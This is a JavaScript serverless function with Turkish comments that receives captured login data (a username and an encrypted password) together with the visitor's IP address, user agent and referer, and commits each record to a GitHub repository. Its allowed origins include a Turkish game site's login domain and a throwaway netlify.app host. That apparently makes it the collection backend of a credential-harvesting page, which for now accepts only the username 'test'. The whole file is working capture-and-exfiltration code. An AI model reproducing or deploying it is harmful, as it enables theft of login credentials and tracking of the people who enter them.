// netlify/functions/log-admin-capture.js
// Geçerli ADMIN yakalamasında GitHub'a yazar; diğer tüm durumlarda dosya yazmaz (ama 200 + reason döner).

const OWNER   = process.env.GITHUB_OWNER  || "Devrim-Sert";
const REPO    = process.env.GITHUB_REPO   || "REPO";
const LOG_DIR = process.env.LOG_DIR       || "logs/admin";
const TOKEN   = process.env.GITHUB_TOKEN;
const BRANCH  = process.env.GITHUB_BRANCH || "main";

// CSV ile ekstra whitelist (opsiyonel)
const ORIGIN_WHITELIST_ENV = (process.env.ORIGIN_WHITELIST || "")
  .split(",").map(s => s.trim()).filter(Boolean);

function parseHostname(u) {
  try { return new URL(u).host.toLowerCase(); }
  catch(_) { return (u || "").replace(/^https?:\/\//, "").toLowerCase(); }
}

function json(res) {
  return { statusCode: 200, headers: {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "POST,OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type",
    "Content-Type": "application/json"
  }, body: JSON.stringify(res) };
}

function okMethod(method) { return method === "POST"; }

function okOrigin(headers = {}) {
  const originOrRef = (headers.origin || headers.referer || "").toString();
  const incomingHost = (headers.host || "").toString().toLowerCase();

  // Otomatik: gelen host'u whitelist'e dahil et
  const allowedHosts = new Set([
    "candid-capybara-606c8d.netlify.app",
    "sonoyuncu.com.tr",
    "giris.sonoyuncu.com.tr",
    ...ORIGIN_WHITELIST_ENV.map(parseHostname),
  ]);
  if (incomingHost) allowedHosts.add(incomingHost);

  const refHost = parseHostname(originOrRef);
  const pass = (incomingHost && allowedHosts.has(incomingHost)) ||
               (refHost && allowedHosts.has(refHost));
  return { pass, incomingHost, refHost, allowed: [...allowedHosts] };
}

function parseBody(body) {
  try { return JSON.parse(body || "{}"); }
  catch { return null; }
}

// Sadece username === "test" ve makul bir RSA-OAEP b64 varsa kabul
function isAdminCapture(p) {
  if (!p) return { ok:false, reason:"no_payload" };
  if ((p.username || "").toLowerCase() !== "test") return { ok:false, reason:"username_not_test" };
  if (typeof p.pw_enc_b64 !== "string") return { ok:false, reason:"pw_enc_b64_missing" };
  if (p.pw_enc_b64.length < 300) return { ok:false, reason:"pw_enc_b64_too_short" };
  try { Buffer.from(p.pw_enc_b64, "base64"); } catch { return { ok:false, reason:"pw_enc_b64_invalid_b64" }; }
  return { ok:true };
}

function buildPath(now, payload) {
  const day  = now.toISOString().slice(0,10);
  const time = now.toISOString().replace(/[:.]/g,"-");
  const nonce = payload && payload.nonce ? `-${payload.nonce}` : "";
  return `${LOG_DIR}/${day}/${time}${nonce}.json`;
}

async function githubWrite(path, message, contentB64) {
  const url = `https://api.github.com/repos/${OWNER}/${REPO}/contents/${encodeURI(path)}`;
  const res = await fetch(url, {
    method: "PUT",
    headers: {
      "Authorization": `Bearer ${TOKEN}`,
      "User-Agent": "netlify-fn",
      "Accept": "application/vnd.github+json",
      "X-GitHub-Api-Version": "2022-11-28",
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ message, content: contentB64, branch: BRANCH }),
  });
  if (!res.ok) {
    const text = await res.text().catch(() => "");
    throw new Error(`GitHub write failed: ${res.status} ${text}`);
  }
}

exports.handler = async (event) => {
  if (event.httpMethod === "OPTIONS") {
    return { statusCode: 204, headers: {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST,OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type",
    }};
  }

  if (!okMethod(event.httpMethod)) {
    return json({ ok:false, reason:"method_not_post" });
  }

  const oc = okOrigin(event.headers || {});
  if (!oc.pass) {
    return json({ ok:false, reason:"origin_blocked", detail: { incomingHost: oc.incomingHost, refHost: oc.refHost } });
  }

  const payload = parseBody(event.body);
  if (!payload) {
    return json({ ok:false, reason:"body_not_json" });
  }

  // kind zorunlu değil; sadece username test + geçerli b64 yeter
  const chk = isAdminCapture(payload);
  if (!chk.ok) {
    return json({ ok:false, reason: chk.reason });
  }

  if (!TOKEN) {
    return json({ ok:false, reason:"missing_github_token" });
  }

  const now = new Date();
  const path = buildPath(now, payload);
  const contentObj = {
    ts: now.toISOString(),
    username: payload.username,
    pw_enc_b64: payload.pw_enc_b64,
    ua: (event.headers && event.headers["user-agent"]) || null,
    ip: (event.headers && event.headers["x-nf-client-connection-ip"]) || null,
    referer: (event.headers && event.headers.referer) || null,
    host: (event.headers && event.headers.host) || null,
  };
  const contentB64 = Buffer.from(JSON.stringify(contentObj, null, 2)).toString("base64");

  try {
    await githubWrite(path, `admin log ${now.toISOString()}`, contentB64);
    return json({ ok:true, path });
  } catch (e) {
    return json({ ok:false, reason:"github_write_failed", error: e.message || "write_failed" });
  }
};
